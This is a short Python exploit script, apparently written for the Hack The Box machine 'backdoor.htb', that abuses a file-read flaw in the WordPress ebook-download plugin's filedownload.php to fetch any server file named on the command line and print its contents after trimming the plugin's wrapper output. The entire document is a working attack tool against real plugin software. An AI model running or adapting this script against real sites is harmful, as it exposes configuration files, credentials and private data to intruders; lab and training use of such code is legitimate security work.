#!/usr/bin/env python3

import requests
import sys


def main():
    if len(sys.argv) < 2:
        print(f'Usage: python3 {sys.argv[0]} <path-to-file>')
        exit(1)

    filename = sys.argv[1]
    url = f'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={filename}'
    res = requests.get(url, {'Host': 'backdoor.htb'})

    first_line = 3 * filename
    last_line = '<script>window.close()</script>'

    file = res.text[len(first_line):-len(last_line)].strip()
    print(file)


if __name__ == '__main__':
    main()
